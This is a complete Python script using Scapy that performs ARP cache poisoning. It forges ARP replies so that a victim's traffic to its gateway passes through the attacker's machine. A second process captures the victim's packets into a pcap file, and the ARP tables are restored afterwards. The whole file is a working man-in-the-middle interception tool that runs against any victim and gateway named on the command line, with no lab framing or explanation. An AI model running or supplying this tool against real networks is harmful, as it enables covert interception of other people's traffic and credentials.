from multiprocessing import Process
from scapy.all import send, sniff, srp
import sys
import time

from scapy.layers.l2 import Ether, ARP
from scapy.utils import wrpcap


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


def poison(victim, victimmac, gateway, gatewaymac):
    while True:
        try:
            poison_victim = ARP(op=2, psrc=gateway, pdst=victim, hwdst=victimmac)
            poison_gateway = ARP(op=2, psrc=victim, pdst=gateway, hwdst=gatewaymac)
            send(poison_victim)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore(victim, victimmac, gateway, gatewaymac)
            break


def sniff_packets(victim, interface, gateway, count=100):
    time.sleep(5)
    bpf_filter = f"ip host {victim}"
    packets = sniff(count=count, filter=bpf_filter, iface=interface)
    wrpcap('arper.pcap', packets)
    print('Got the packets')
    restore(victim, get_mac(victim), gateway, get_mac(gateway))
    print('Finished.')


def restore(victim, victimmac, gateway, gatewaymac):
    print('Restoring ARP tables...')
    send(ARP(op=2, psrc=gateway, hwsrc=gatewaymac, pdst=victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
    send(ARP(op=2, psrc=victim, hwsrc=victimmac, pdst=gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    victimmac = get_mac(victim)
    gatewaymac = get_mac(gateway)

    poison_process = Process(target=poison, args=(victim, victimmac, gateway, gatewaymac))
    sniff_process = Process(target=sniff_packets, args=(victim, interface, gateway))

    poison_process.start()
    sniff_process.start()

    poison_process.join()
    sniff_process.join()
